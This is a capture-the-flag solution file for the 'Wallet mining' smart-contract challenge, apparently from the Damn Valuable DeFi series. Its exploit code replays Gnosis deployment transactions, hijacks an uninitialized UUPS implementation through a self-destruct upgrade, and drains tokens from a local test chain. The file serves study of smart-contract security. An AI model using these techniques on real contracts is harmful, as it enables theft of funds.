const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Wallet mining", function () {
  let deployer, player;
  let token, authorizer, walletDeployer;
  let initialWalletDeployerTokenBalance;

  const DEPOSIT_ADDRESS = "0x9b6fb606a9f5789444c17768c6dfcf2f83563801";
  const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, ward, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy authorizer with the corresponding proxy
    authorizer = await upgrades.deployProxy(
      await ethers.getContractFactory("AuthorizerUpgradeable", deployer),
      [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
      { kind: "uups", initializer: "init" }
    );

    expect(await authorizer.owner()).to.eq(deployer.address);
    expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
    expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

    // Deploy Safe Deployer contract
    walletDeployer = await (
      await ethers.getContractFactory("WalletDeployer", deployer)
    ).deploy(token.address);
    expect(await walletDeployer.chief()).to.eq(deployer.address);
    expect(await walletDeployer.gem()).to.eq(token.address);

    // Set Authorizer in Safe Deployer
    await walletDeployer.rule(authorizer.address);
    expect(await walletDeployer.mom()).to.eq(authorizer.address);

    await expect(
      walletDeployer.can(ward.address, DEPOSIT_ADDRESS)
    ).not.to.be.reverted;
    await expect(
      walletDeployer.can(player.address, DEPOSIT_ADDRESS)
    ).to.be.reverted;

    // Fund Safe Deployer with tokens
    initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
    await token.transfer(
      walletDeployer.address,
      initialWalletDeployerTokenBalance
    );

    // Ensure these accounts start empty
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq("0x");
    expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq(
      "0x"
    );
    expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq(
      "0x"
    );

    // Deposit large amount of DVT tokens to the deposit address
    await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are set correctly
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
    expect(await token.balanceOf(walletDeployer.address)).eq(
      initialWalletDeployerTokenBalance
    );
    expect(await token.balanceOf(player.address)).eq(0);
  });

  /**
   * This challenge involves identifying two main exploits in the WalletDeployer and AuthorizerUpgradeable contract.
   * The first exploit is identifying the replay-attack vulnerability based on the information provided by the challenge.
   * The challenge provides the address of the official Gnosis Safe factory and master copy at the addresses
   * 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B and 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F respectively.
   * We can see from etherscan.io that these contracts were deployed on mainnet by the Gnosis deployer (0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A).
   * We can retrieve the transaction data of these deployments, serialize them and use them to deploy the Gnosis Safe and Proxy Factory contracts at these
   * exact addresses. I have written a script to retrieve the relevant tx data in `scripts/wallet-mining/getSerializedTxs.js`.
   * We can also make an educated guess regarding the `DEPOSIT_ADDRESS` which is likely one of the gnosis vaults deployed by the proxy contract.
   * We can test this theory by batch pre-computing the deployment addresses of gnosis safes based on the proxy and incrementing nonces.
   * We later find that the `DEPOSIT_ADDRESS` is at nonce 43.
   *
   * The second exploit, which admittedly was a bit more difficult to find, is a vulnerability in the AuthorizerUpgradeable contract.
   * Based on the infamous UUPS vulnerability discussed in https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680,
   * we can effectively render the proxy contract useless by having the implementation contract call to a contract that self-destructs itself.
   * To achieve this, we can first call the `init()` function from the AuthorizerUpgradeable IMPLEMENTATION contract, which should gives us the ownership of the contract.
   * This is done to allow us to call the `upgradeToAndCall` function (which is access controlled )to update it to a malicious contract that can self-destruct itself.
   * Doing this causes the proxy contract to be rendered useless as it's implementation contract no long exists, and as a result, effectively allows us to bypass
   * the multiple checks in the `can()` function of the WalletDeployer contract. This allows us to create multiple gnosis safes via the `drop()` function, and withdraw tokens each time.
   *
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const {
      provider,
      utils: { getAddress },
      constants: { AddressZero, MaxUint256 },
    } = ethers;
    const walletDeployerPlayer = walletDeployer.connect(player);
    const data = require("./serializedTransactionPayload.json");

    const gnosisSingletonDeploymentTx = data.GNOSIS_SAFE_SINGLETON_DEPLOY_TX;
    const gnosisFactoryDeploymentTx = data.GNOSIS_PROXY_FACTORY_DEPLOY_TX;
    const randomTx = data.RANDOM_GNOSIS_DEPLOYER_TX;
    const gnosisDeployerAddress = data.GNOSIS_DEPLOYER_ADDRESS;

    // Fund the gnosis deployer address some eth to cover deployment costs
    await player.sendTransaction({
      to: gnosisDeployerAddress,
      value: ethers.utils.parseEther("5"),
    });

    // Send the gnosis singleton deployment transaction. This will deploy the master copy of the Gnosis Safe contract.
    // We can predict the address of the Gnosis Safe contract by using the deployer address and nonce.
    // We know that the Gnosis Deployer address had a nonce of 0 at the time of deployment.
    // This gives us the same deployment address as the one used in the WalletDeployer contract (0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F).
    // We also perform a check to ensure that the contract has indeed been deployed to the address we want.
    const futureGnosisSingletonAddress = ethers.utils.getContractAddress({
      from: gnosisDeployerAddress,
      nonce: 0,
    });
    expect(futureGnosisSingletonAddress).to.eq(await walletDeployer.copy());
    expect(await provider.getCode(await walletDeployer.copy())).to.eq("0x");
    await provider.sendTransaction(gnosisSingletonDeploymentTx);
    expect(await provider.getCode(await walletDeployer.copy())).to.not.eq("0x");

    // Send the gnosis factory deployment transaction. This will deploy the Gnosis Proxy Factory contract.
    // We essentially do the same as above for the deployment of the gnosis proxy factory contract.
    // One thing to note is that the nonce of the Gnosis Deployer address actually sits at 2, not 1 (in reference to Etherscan).
    // This means that we have to increment the nonce by performing a transaction for the Gnosis deployer.
    // For this, we can replay a random transaction (randomTx) that the Gnosis Deployer address performed.
    // We then perform the deployment of the Gnosis Proxy Factory contract.
    await provider.sendTransaction(randomTx);
    expect(await provider.getTransactionCount(gnosisDeployerAddress)).to.eq(2);

    const futureGnosisFactoryAddress = ethers.utils.getContractAddress({
      from: gnosisDeployerAddress,
      nonce: 2,
    });
    expect(futureGnosisFactoryAddress).to.eq(await walletDeployer.fact());
    expect(await provider.getCode(await walletDeployer.fact())).to.eq("0x");
    await provider.sendTransaction(gnosisFactoryDeploymentTx);
    expect(await provider.getCode(await walletDeployer.fact())).to.not.eq("0x");

    // With the master copy and factory deployed, we can now deploy a Gnosis Safe contract via the walletDeployer contract.
    // However, before we do that, we need to check how many transactions are required for the deployment proxy to reach the deposit address.
    // Upon running the loop below, we find that we get our DEPOSIT_ADDRESS at nonce 43. This means we need to deploy 43 Gnosis Safe contracts.
    let nonce = await provider.getTransactionCount(walletDeployer.address);
    while (true) {
      const gnosisSafeAddress = ethers.utils.getContractAddress({
        from: futureGnosisFactoryAddress,
        nonce: nonce,
      });

      if (getAddress(gnosisSafeAddress) === getAddress(DEPOSIT_ADDRESS)) {
        console.log("Found our Gnosis Safe at nonce: ", nonce);
        break;
      } else {
        nonce++;
      }
    }

    // We will create the gnosis safe contract instance here for future use.
    const gnosisSafe = await ethers.getContractAt(
      "GnosisSafe",
      futureGnosisFactoryAddress,
      player
    );

    // We can now get the contract instance of the implementation contract of the authorizer contract.
    // We can manually initialize it with init([] ,[]) to give us the ownership of the implementation contract.
    const authorizerUpgradeableImplementationContract =
      "0x" +
      (
        await provider.getStorageAt(
          authorizer.address,
          // ERC-1967 slot for the implementation contract
          "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
        )
      ).slice(-40);
    const authorizerImplementation = await ethers.getContractAt(
      "AuthorizerUpgradeable",
      authorizerUpgradeableImplementationContract,
      player
    );
    await authorizerImplementation.init([], []);

    // We are also going to reuse the TokenExploiter contract which was previously written for a previous challenge in `contracts/backdoor/WalletRegistryAttacker.sol`.
    // This is just a contract with a `approveToken()` function that approves the player's address to spend the maximum token amount.
    // This will be used to allow the player to take all the tokens from the gnosis safe at (0x9b6fb606a9f5789444c17768c6dfcf2f83563801).
    const tokenExploiter = await (
      await ethers.getContractFactory("TokenExploiter", player)
    ).deploy();

    // We will now deploy the authorizer attacker contract and upgrade the authorizer implementation contract to it,
    // while also calling the `attack()` function which is used to selfdestruct the authorizer attacker contract.
    // This essentially allows us to bypass the various checks in the `can()` function of the walletDeployer contract,
    // which is dependent on the implementation.
    // This essentially allows us to bypass the `if iszero(staticcall(gas(),m,p,0x44,p,0x20)) {return(0,0)}` since low level call like
    // staticcall does not check for the function's existence, nothing happens and the call is made successfully.
    // We can also safely pass `if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}` since no data is returned.
    const authorizerAttacker = await (
      await ethers.getContractFactory("AuthorizerAttacker", player)
    ).deploy();
    await authorizerImplementation.upgradeToAndCall(
      authorizerAttacker.address,
      authorizerAttacker.interface.encodeFunctionData("attack()")
    );

    // We deploy the Gnosis Safe contract 44 times to retrieve all the tokens in the WalletDeployer contract.
    // The last Gnosis safe will be the one at our DEPOSIT_ADDRESS (0x9b6fb606a9f5789444c17768c6dfcf2f83563801).
    // While we can use `execTransaction` to drain the token from the last vault, I have chosen to use the `setup` method
    // as used in the previous challenge to keep it simple.
    for (let i = 0; i < nonce; i++) {
      await walletDeployerPlayer.drop(
        gnosisSafe.interface.encodeFunctionData(
          "setup(address[],uint256,address,bytes,address,address,uint256,address)",
          [
            [player.address],
            1,
            tokenExploiter.address,
            // We use the `encodeFunctionData` method to encode the `approveToken` function call.
            // We do this to approve the player's address to spend the maximum token amount from the vault.
            // We do this via a middleman contract because we cannot approve directly from the token contract
            // as the `setup()` function relies on `delegateCall` which effectively prevents us from approving the token due to wrong storage context.
            tokenExploiter.interface.encodeFunctionData(
              "approveToken(address,address)",
              [token.address, player.address]
            ),
            AddressZero,
            AddressZero,
            0,
            AddressZero,
          ]
        )
      );
    }

    // Then we simply withdraw all the tokens from the DEPOSIT_ADDRESS gnosis vault.
    await token
      .connect(player)
      .transferFrom(DEPOSIT_ADDRESS, player.address, DEPOSIT_TOKEN_AMOUNT);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Factory account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.fact())
    ).to.not.eq("0x");

    // Master copy account must have code
    expect(
      await ethers.provider.getCode(await walletDeployer.copy())
    ).to.not.eq("0x");

    // Deposit account must have code
    expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.not.eq("0x");

    // The deposit address and the Safe Deployer contract must not hold tokens
    expect(await token.balanceOf(DEPOSIT_ADDRESS)).to.eq(0);
    expect(await token.balanceOf(walletDeployer.address)).to.eq(0);

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)
    );
  });
});
